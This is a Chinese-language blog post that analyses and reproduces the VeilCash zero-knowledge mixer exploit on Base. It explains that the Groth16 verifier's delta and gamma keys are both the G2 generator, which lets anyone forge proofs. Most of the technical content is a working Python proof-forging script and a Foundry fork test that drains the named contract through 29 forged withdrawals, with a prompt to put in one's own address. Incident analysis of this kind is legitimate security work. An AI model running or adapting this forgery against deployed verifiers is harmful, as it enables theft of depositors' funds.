#  Web3安全之我是如何和两百万美金擦肩而过的-VeilCash分析复现  
 Hiroki Sawada   2026-03-14 17:13  
  
标题党一下(^▽^)【现在公众号刚开,流量太小了】  
  
马前炮变马后炮了o(╥﹏╥)o。  
  
后小记  
  
VeilCash攻击发生于2月20号,笔者是在22号开始分析并且写完exp,尝试去寻找类似漏洞。  
  
找了10几个仓库, 只看了5个，25号发出文章, FOOM协议(26号被攻击200WU,赏金30w+)。  
  
30W+赏金就是这样错过了。只怪自己没专注。  
  
早期还在群里聊：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NE5jetXWSiaHeCTicWia2fribne86rkYjDGsnXqKKFwicNbQ8yrnw4bVdC04FEr3FicQnY8T9uh9TRCFRdoEq41nCeZEEUwqmvfS5jMZIibJLTcKibA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NE5jetXWSiaGD7WU4ojJ0XFak1FaHcFRia8Fte0uWlEw8icJPq56Aj3xMRO6Gk6daB358icG6OCcHdcobcoSKOMKgsDUJu3UEfiapJRtCicUjUtQI/640?wx_fmt=png&from=appmsg "")  
  
后来和朋友聊发现....  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NE5jetXWSiaFQPCs2Sz88urp1wyKtmNjIRichrP9ibt9bZn2hyTQxic1cygrQLzciblLNJkiaCpAOsLzfiaTSsEQT44Hu2vZI0eV1kDJvdWFXDLL1U/640?from=appmsg "")  
  
两百万  
的漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NE5jetXWSiaEeBS4HfOQtUZe2j2TXTiaiaRYvBSCDFvKicBGpYXU3B9oLSVz3Ptjibo4A5OnRLgJrSdIEMUHEricQx711FhzYtu8Tia5uJj8chG3cA/640?from=appmsg "")  
![]( "")  
  
  
最大的一笔：  
https://etherscan.io/tx/0xce20448233f5ea6b6d7209cc40b4dc27b65e07728f2cbbfeb29fc0814e275e48  
 (白帽)  
  
FOOM协议被攻击后,在各个链又发生了一系列的小额攻击(各个链都有, 随便举例几个):  
  
https://app.blocksec.com/phalcon/explorer/tx/eth/0xb74f0bd48a7b3f3a36a6d77dbb061507676ee12b9e34600436162eac94a05ccb  
  
https://app.blocksec.com/phalcon/explorer/tx/bsc/0xf744290a797b5a4f044f4b619445c72210ee7cf259206a8c2a139b8c085ac5e0  
  
https://app.blocksec.com/phalcon/explorer/tx/bsc/0x12eef5fe3c2172a0696a9a7f28eca127f8af38e8d8f1e78bc6db643d54228fe9  
  
https://app.blocksec.com/phalcon/explorer/tx/eth/0x0d029685ad27bf9faa7460641f36a6dba9ed06f112d81c419800706fc284daa3  
  
  
后面看到有个朋友发FOOM了,也可以看看更具体的漏洞原理：   
https://hackmd.io/@8uBogvwwTWSq6LUV9pDzfw/Ski3AT6OWg  
  
  
下面是当时写的veilcash文章,直接贴过来了：  
  
突然看到一起涉及到混币器类的Zk相关攻击事件,详细分析下整个过程和Exp。  
  
事件梳理  
  
通告:   
https://x.com/DefimonAlerts/status/2024937367518249166  
  
受害合约：   
https://basescan.org/address/0xd3560ef60dd06e27b699372c3da1b741c80b7d90#code  
  
攻击者：   
https://basescan.org/address/0x49a7ca88094b59b15eaa28c8c6d9bfab78d5f903  
  
攻击TX：   
https://basescan.org/tx/0x5ff6dbc33e77fab8dc086bb9ea3c88f1ba81df198d24ec9fc0c5b50fb1a4a17d  
  
Loss: ~5.7k  
  
不到10分钟有白帽抢跑了另外3个易受攻击的合约：  
https://app.blocksec.com/phalcon/explorer/tx/base/0xb8faeac44b76690d456543952eb704c495e8f7bbfe900dc33bfb3dc7f4368f8c  
  
https://app.blocksec.com/phalcon/explorer/tx/base/0x710f27164abb1b650019d7f237bfbcad20388961fba5b7606f3caa3fff20bc92  
  
https://app.blocksec.com/phalcon/explorer/tx/base/0x6547c899d0a4cff4730d857ba64b61f4b55c225f0599cabf5fb9ec94ca9187fc  
  
分析  
  
首先直接看攻击TX:  
  
首先通过攻击合约调用getLastRoot获取了一个值：0x2e0f278810b48ef13b3ac54bf0c7aec8475d9e6cadbdcfc984724c1bf958c063。  
  
然后构造了一些withdraw方法的参数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NE5jetXWSiaEibfJicEiavG3vTOpLPsibkcHVYbqoTRn91GxpKX4IcNfnVBoQ3QhZ5vp7RrPu84484GibTX64gzH5kZJBserpfSpeunjwzqFks56o/640?wx_fmt=png&from=appmsg "")  
  
  
然后我们继续debug看到关键的一点：  
  
isKnownRoot方法判断_root是不是"LastRoot"  
  
随后验证合约的verifyProof方法返回"True"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NE5jetXWSiaHCID5edsYxriclTsu0ACsUG6q8GianHu5K8ib7hgbEpzaMcWkIYJlh1miceMZhpNoFVoDEGMrYEcj5sSVR3fribdOjfKnn8M2ibPJjQ/640?wx_fmt=png&from=appmsg "")  
  
然后就跳入_processWithdraw方法进行放款,攻击者获益：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NE5jetXWSiaEZdicg9oTSAhsS1aQZmLjNSCMNhRRepJTdibuiaXWgRwTXdhfMibBn6Bp8bs8Qd1ssfe8ehibGdYpNX9iaEDf1509aMzy9n1kEMCicJE/640?wx_fmt=png&from=appmsg "")  
  
  
现在来分析代码：  
  
首先看Veil_01_ETH合约的核心方法,所有的攻击都在这个内部调用和进行  
  
```
function withdraw(        uint256[2] calldata _pA,        uint256[2][2] calldata _pB,        uint256[2] calldata _pC,        bytes32 _root,        bytes32 _nullifierHash,        address _recipient,        address _relayer,        uint256 _fee,        uint256 _refund    ) external payable nonReentrant {        require(_fee <= denomination, "Fee exceeds transfer value");        require(!nullifierHashes[_nullifierHash], "The note has been already spent");        require(isKnownRoot(_root), "Cannot find your merkle root"); // Make sure to use a recent one        require(            verifier.verifyProof(                _pA,                _pB,                _pC,                [                    uint256(_root),                    uint256(_nullifierHash),                    uint256(uint160(_recipient)),                    uint256(uint160(_relayer)),                    _fee,                    _refund                ]            ),            "Invalid withdraw proof"        );        nullifierHashes[_nullifierHash] = true;        _processWithdraw(_recipient, _relayer, _fee, _refund);        emit Withdrawal(_recipient, _nullifierHash, _relayer, _fee, block.timestamp);    }
```  
  
  
其中withdraw有几个require。  
  
```
require(!nullifierHashes[_nullifierHash], "The note has been already spent");require(isKnownRoot(_root), "Cannot find your merkle root"); // Make sure to use a recent one
```  
  
  
nullifierHash随便使用几个没被用过的就可以,攻击者这里用的是（0xdead0000 到 0xdead001c）  
  
  
isKnownRoot就是返回的Lastgetroot。  
  
这两个不涉及到漏洞。  
  
  
主要看verifier合约的verifyProof方法,  
  
虽然之前看过龙卷风原理,但是忘记了很多,又重新简了解一下这块。现在直接结合代码分析。  
  
  
Groth16 零知识证明系统依赖于以下配对方程来验证 proof：  
  
```
e(A, B) = e(α, β) · e(L, γ) · e(C, δ)e(-A, B) · e(α, β) · e(vk_x, γ) · e(C, δ) = 1。(vk_x在这里是L)
```  
  
  
α, β, γ, δ 是 trusted setup 生成的公共参数  
  
A, B, C 是 proof 的组成部分  
  
其中L（vk_x）是公共输入的线性组合：  
  
```
vk_x = IC[0] + pubSignals[0]·IC[1] + pubSignals[1]·IC[2] + ... + pubSignals[n]·IC[n]
```  
  
  
对应到 Verifier 合约中checkPairing方法：  
  
```
// vk_x 的线性组合计算mstore(_pVk, IC0x)mstore(add(_pVk, 32), IC0y)              // 起点：IC[0]g1_mulAccC(_pVk, IC1x, IC1y, calldataload(add(pubSignals, 0)))   // + sig[0]·IC[1]g1_mulAccC(_pVk, IC2x, IC2y, calldataload(add(pubSignals, 32)))  // + sig[1]·IC[2]g1_mulAccC(_pVk, IC3x, IC3y, calldataload(add(pubSignals, 64)))  // + sig[2]·IC[3]g1_mulAccC(_pVk, IC4x, IC4y, calldataload(add(pubSignals, 96)))  // + sig[3]·IC[4]g1_mulAccC(_pVk, IC5x, IC5y, calldataload(add(pubSignals, 128))) // + sig[4]·IC[5]g1_mulAccC(_pVk, IC6x, IC6y, calldataload(add(pubSignals, 160))) // + sig[5]·IC[6]
```  
  
  
然后做 4-pairing 检查，对应：  
e(-A,B) · e(α,β) · e(vk_x,γ) · e(C,δ) = 1  
  
  
定位关键漏洞点：  
   
  
注意看 Verifier 合约的  
verifyProof  
 的函数签名：  
  
```
function verifyProof(    uint[2] calldata _pA,     uint[2][2] calldata _pB,     uint[2] calldata _pC,     uint[6] calldata _pubSignals   // ← 6个公共信号) public view returns (bool)
```  
  
  
再看   
Veil_01_ETH  
 调用   
verifyProof  
 时传入的参数：  
  
```
verifier.verifyProof(    _pA, _pB, _pC,    [        uint256(_root),              // pubSignals[0]        uint256(_nullifierHash),     // pubSignals[1]        uint256(uint160(_recipient)),// pubSignals[2]        uint256(uint160(_relayer)),  // pubSignals[3]        _fee,                        // pubSignals[4]        _refund                      // pubSignals[5]    ])
```  
  
  
共 6 个公共信号，Verifier 接受 6 个，看似没问题。  
 但是注意   
checkField  
 的校验：  
  
```
checkField(calldataload(add(_pubSignals, 0)))    // 检查 pubSignals[0]checkField(calldataload(add(_pubSignals, 32)))   // 检查 pubSignals[1]...checkField(calldataload(add(_pubSignals, 160)))  // 检查 pubSignals[5]checkField(calldataload(add(_pubSignals, 192)))  // ← 检查 pubSignals[6] !!!
```  
  
  
checkField  
 一共检查了 7个值，但   
_pubSignals  
 只有 6 个元素。  
  
  
第 7 次   
checkField(calldataload(add(_pubSignals, 192)))  
 读取的是 calldata 中 pubSignals 数组边界之外的数据，在 EVM 中越界读取 calldata 会返回   
0  
，而   
0 < r  
 恒成立，所以这个检查永远通过，没有实际防护意义。  
  
  
但这只是辅助问题，  
核心漏洞是  
：  
 ZK 电路在生成时绑定了固定的验证密钥（  
alpha, beta, gamma, delta, IC  
）。正常情况下，证明者需要知道真实的   
nullifier  
 和   
secret  
 才能生成有效的 proof。  
  
  
然而注意   
delta  
 和   
gamma  
 的值：  
  
```
uint256 constant deltax1 = 11559732032986387107991004021392285783925812861821192530917403151452391805634;uint256 constant deltax2 = 10857046999023057135944570762232829481370756359578518086990519993285655852781;uint256 constant deltay1 = 4082367875863433681332203403145435568316851327593401208105741076214120093531;uint256 constant deltay2 = 8495653923123431417604973247489272438418190587263600148770280649306958101930;uint256 constant gammax1 = 11559732032986387107991004021392285783925812861821192530917403151452391805634;uint256 constant gammax2 = 10857046999023057135944570762232829481370756359578518086990519993285655852781;uint256 constant gammay1 = 4082367875863433681332203403145435568316851327593401208105741076214120093531;uint256 constant gammay2 = 8495653923123431417604973247489272438418190587263600148770280649306958101930;
```  
  
  
delta  
 和   
gamma  
 的坐标完全相同这两个点都是 BN254 曲线上 G2 的生成元。  
  
  
由于  
delta = gamma = G2  
,trusted setup 泄露  
 所以攻击者可以在不知道任何真实的 witness的情况下，通过数学构造出满足 pairing 方程的伪造 proof。  
  
  
简单说，正常的 Groth16 要求   
delta  
 是一个不知道离散对数的随机点，但这里   
delta  
 就是生成元，攻击者可以利用这个关系自由伪造   
_pC  
，配合任意   
_pA  
,   
_pB  
 构造出令 verifier 返回 true 的假证明。  
  
  
让AI给了一个算法推理  
  
```
#看上文中提到的： e(-A, B) · e(α, β) · e(vk_x, γ) · e(C, δ) = 1。(vk_x在这里是L)当 Groth16 verifier 中 delta == gamma 时，验证方程：e(-A, B) · e(α, β) · e(vk_x, γ) · e(C, δ) = 1由于 δ = γ，可以令：A = alpha, B = beta=> e(-alpha, beta) · e(alpha, beta) = 1 (前两项抵消)剩余：e(vk_x, γ) · e(C, γ) = 1=> e(vk_x + C, γ) = 1=> vk_x + C = 0 (单位元)=> C = -vk_x因此对任意公共输入，只需计算 vk_x 然后取反即可得到合法的 C
```  
  
  
Exp  
  
注意可以修改RECIPIENT(attacker)为自己的地址  
  
生成proof脚本：  
  
```
# BN128 参数q = 21888242871839275222246405745257275088696311157297823662689037894645226208583r = 21888242871839275222246405745257275088548364400416034343698204186575808495617def mod_inv(a, m):    if a == 0: return0    lm, hm = 1, 0    low, high = a % m, m    while low > 1:        r_val = high // low        nm, new = hm - lm * r_val, high - low * r_val        lm, low, hm, high = nm, new, lm, low    return lm % mdef is_inf(P):return P isNoneor P == (0, 0)def g1_add(P, Q):    if is_inf(P): return Q    if is_inf(Q): return P    Px, Py = P; Qx, Qy = Q    if Px == Qx:        if Py != Qy: return (0, 0)        lam = (3 * Px * Px * mod_inv(2 * Py, q)) % q    else:        lam = ((Qy - Py) * mod_inv(Qx - Px, q)) % q    Rx = (lam * lam - Px - Qx) % q    Ry = (lam * (Px - Rx) - Py) % q    return (Rx, Ry)def g1_mul(P, n):    if n == 0or is_inf(P): return (0, 0)    n = n % r    if n == 0: return (0, 0)    result, addend = (0, 0), P    while n:        if n & 1: result = g1_add(result, addend)        addend = g1_add(addend, addend)        n >>= 1    return resultdef g1_neg(P):return P if is_inf(P) else (P[0], (-P[1]) % q)# 验证密钥alpha = (    2154925384931195669696468236414102213237175831097239004580187544114565088054,    18001460744277730361809118000694905394298985948301929180248317609971584489579,)beta_g2 = [    [6506527127757844316976814146688351625449725845044263141394779683713824623154,     17690460444014779949496449078998668128125816378017242793701355602753621513965],    [11009201094018045724233660315410925704657099711816317858836867291351802608623,     16376880945094056840819396114752708108704853396028129730069854552293465777470],]IC = [    (7973665934633372091847544168484351468565213955364578075497257513375472547207,  2206284249359232574697410348400457777377821032087731400384197507173657686244),    (15935917542493937270763159654953372361575624390474494541899518338547801284825, 7483347661901730772824144725877005745649378610890006416481422043202137282062),    (17541785693502679899851050552822855642786217045482292393397340918015034891035, 1878998464440192426911186511021639714357781475338066195960321060067544154018),    (15219522276005360494538133579719944221818556329048979794389309903367944238313, 7599924382270821851302251388292173382975404428821324846678778517474764990085),    (10988078586746392757618261165860555654006857094990773253989673802610673858310,  1465978515014707005171418532244509163483236924519613019721420300692559854480),    (3932393824425538136207001306737452450281214607735231107728719002282208062428,   2867593436198231124915780492777847032615882935408999107919393702948561951053),    (12662177190614175864686264208497556191915750875078368326557529632378170806654, 8394556711944233139420220581997572725974361713606992882936372747470120922119),]def forge_proof(root, nullifier_hash, recipient, relayer=0, fee=0, refund=0):    """    pA = alpha, pB = beta, pC = -vk_x    验证方程：e(-alpha,beta)·e(alpha,beta)·e(vk_x,gamma)·e(-vk_x,delta) = 1    因 delta == gamma，后两项也抵消，整体为 1 ✓    """    pub = [x % r for x in [root, nullifier_hash, recipient, relayer, fee, refund]]    vk_x = IC[0]    for i, s in enumerate(pub):        vk_x = g1_add(vk_x, g1_mul(IC[i+1], s))    return alpha, beta_g2, g1_neg(vk_x)# Merkle root（从合约获取，用测试中的 root）  # 0xD3560eF60Dd06E27b699372c3da1b741c80B7D90的getLastRoot中的ROOT      = 0x2e0f278810b48ef13b3ac54bf0c7aec8475d9e6cadbdcfc984724c1bf958c063# attacker 地址（test exp中的attacker地址就是这个。你也换成你自己的地址）RECIPIENT = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496for i in range(29):    nullifier = 0xdead0000 + i    pA, pB, pC = forge_proof(ROOT, nullifier, RECIPIENT)    print(f"[{i+1:02d}] nullifier={hex(nullifier)}")    print(f"     pA={list(pA)}")    print(f"     pB={pB}")    print(f"     pC={list(pC)}")
```  
  
  
我精简了一下attacker=address(this)也就是VeilExploitTest。如果自己想验证可以输出一下就可以。  
  
fork test:  
  
```
// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.20;import {Test, console2} from"forge-std/Test.sol";interfaceIVeil {    function withdraw(        uint256[2] calldata _pA,        uint256[2][2] calldata _pB,        uint256[2] calldata _pC,        bytes32 _root,        bytes32 _nullifierHash,        address _recipient,        address _relayer,        uint256 _fee,        uint256 _refund    ) external payable;    function denomination() external view returns (uint256);    function getLastRoot() external view returns (bytes32);    function isKnownRoot(bytes32 _root) external view returns (bool);}contract VeilExploitTest is Test {    address constant VEIL = 0xD3560eF60Dd06E27b699372c3da1b741c80B7D90;    string constant RPC = "Your_RPC";    IVeil veil;    receive() external payable {}    function setUp() public {        vm.createSelectFork(RPC, 42410816);        veil = IVeil(VEIL);    }    function testExploit() public {        uint256 contractBefore = address(VEIL).balance;        uint256 attackerBefore = address(this).balance;        console2.log("Contract balance before:", contractBefore, "WEI");        bytes32 root = veil.getLastRoot();        require(veil.isKnownRoot(root), "root not found");        // pA = alpha, pB = beta (固定)        // pC = -vk_x (每次随 nullifier 变化)        // 利用 delta == gamma，四个 pairing 项两两抵消，verifyProof 恒返回 true        uint256[2] memory pA = [            uint256(2154925384931195669696468236414102213237175831097239004580187544114565088054),            uint256(18001460744277730361809118000694905394298985948301929180248317609971584489579)        ];        uint256[2][2] memory pB = [[            uint256(6506527127757844316976814146688351625449725845044263141394779683713824623154),            uint256(17690460444014779949496449078998668128125816378017242793701355602753621513965)        ],[            uint256(11009201094018045724233660315410925704657099711816317858836867291351802608623),            uint256(16376880945094056840819396114752708108704853396028129730069854552293465777470)        ]];        uint256[2][29] memory pCs = [            [uint256(17056448146598339440669819372000654935125519965723441515682837723077208397864), uint256(12246358530468133712272681913236493343371094448856754294317549734508490018407)],            [uint256(9327443220812806761974578463268959170717622765362372090434070295965299045697),  uint256(2946474554166798248311742636833059292402475261049084896020748600529709049690)],            [uint256(532164647944725611569961375183182578208376967038909550679938587573947046882),   uint256(20820341571186415994723455378276862003576668978258650039627260066027811963682)],            [uint256(21018507068289624370778597757771515051400197130957495224941790732349922989963), uint256(4655419615769143813997375753418885551577825418104883107281329647246076383051)],            [uint256(19867982683559248082889966312206713865709007661786585670116433082120068164097), uint256(18483353302837155773381242316805095339335260641032160734791694543546594468327)],            [uint256(45255584050611622093309330123617175625879173757013668930846163683120207254),    uint256(13621444729733989614991593817314730631856695320884544583786625582486048714946)],            [uint256(11468104856785807190066459418985632171457984484354773478780809224104139436422), uint256(11914951497639375553727760932142846661674596707721573859626272542756989758807)],            [uint256(16950417302736938899166505338227683955547557781274019075687826622456312937657), uint256(16949486977748210271450380687104326744677977409507631849385501912303075384988)],            [uint256(13696814218863150463108992378690432976612334246143648877460490453666815559050), uint256(10898493461520060463478920074306024183123419751527051258045569088982078814916)],            [uint256(13660196102438169544658924660971254535424087989837786864359299899475871642830), uint256(19613905233705763309249389557929358632802147971857032994279867259180282869073)],            [uint256(1820536336835174392779972379438650366385296231331953691635878473564824301884),   uint256(3099301275614450777508283009230460037962426714893038249012670220374645204271)],            [uint256(13865226835254950823153361941795510469920852451874193089863908239204862075804), uint256(505966092550332719700112178432435482092304211616635806682375796695089841815)],            [uint256(21209473096885935721275170299398153705432488948627439133239431588667194851394), uint256(149181357862982330092601836070894595905978381222066797645770265668509568186)],            [uint256(325421812445316074844683399450347652679394209555933377270290559091924678714),   uint256(21667140978932254751040680136558241590430978608158321561123141115872316783955)],            [uint256(17104845052615789707248280716729908257156481486857116667188816379458318709211), uint256(12853671580476256155382540676646897308448593248901100402787783351151104700614)],            [uint256(12506732765204388945265828032764614683488993391830240999912979429273176659289), uint256(6614695485376537517431143270140454578387400082473077062420501307086775812271)],            [uint256(17690044969616912003745360318053019739835941511459408964802226729016042135404), uint256(12669789280962538673062725594824910982068814311710417062495734598243860735360)],            [uint256(6996731329476860277571451441801755017959019515644183524224946796382207335701),  uint256(18616223872111233299681552333980176090508028252628765719079062461016080367414)],            [uint256(6893445890452651726727514058314479255041291226466709191156777452691458356548),  uint256(8214479992693515924866210260584092186750724285250832402345739798055614448447)],            [uint256(14281343910606061850956427499052642767114872299202991000589889916603006713138), uint256(5147463513182492962052321515135346077543403649783643190025125203769971117997)],            [uint256(1923227622187512870390397971866910160904985038774509858089532559577668726076),   uint256(2141467635776242007445538984396716428430179554020418569784152236253292049516)],            [uint256(17066159945640027319405372144238659370475447566108637729201651737857256445843), uint256(20125332832941748830277571375169312404248227700304071517489665334649694556201)],            [uint256(8844601939081322963333975694315457521065890089819038674777822446318016050785),  uint256(2253616250092197945123960784213105522069885887353280402123816706846993540847)],            [uint256(21469974559910948170468773548098066250334506683978852903889929408878358256376), uint256(16766912730843912862617419397303373582016900349245250713597150864600223164565)],            [uint256(19514070063183657591364134885484903586941198904648872710647076984230640156352), uint256(21302852504681748272020715416929824500008227955874406418881435479391667876274)],            [uint256(21225097530642609308276788446341258999824500423281873547061403346496171892694), uint256(19723321054909431799881479206887964127379317880216983171168070946108017741986)],            [uint256(4978420568866712160477108716337558668542050654942933024945158457406895743040),  uint256(9058282636171791487741316727747228022793018498294265276809375045063321709659)],            [uint256(11421808125132717363525831648936771148263496811400684681178530794278322984041), uint256(8955497467582255048750321674921651536831430920650328691857807599737172339346)],            [uint256(1556267318114033432573826516110527264716357859377500915252906395596424925395),  uint256(10293596014709845307926935749171540813025518266477110014502123855342326776931)]        ];        for (uint256 i = 0; i < 29; i++) {            bytes32 nullifier = bytes32(uint256(0xdead0000 + i));            uint256[2] memory pC = pCs[i];            veil.withdraw(pA, pB, pC, root, nullifier, address(this), address(0), 0, 0);        }        uint256 stolen = address(this).balance - attackerBefore;        console2.log("Stolen:", stolen, "WEI");        assertEq(address(VEIL).balance, 0);        assertEq(stolen, contractBefore);     }}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NE5jetXWSiaEfiaVHdMEK4NLeKSXuMtzhkELLvTNeQwnCHkUPbuXy40EicVicE9UQn6fNdZgkbqODysSU2BaIpM4rn92vsFfqWvu44icISuv19U0/640?wx_fmt=png&from=appmsg "")  
  
  
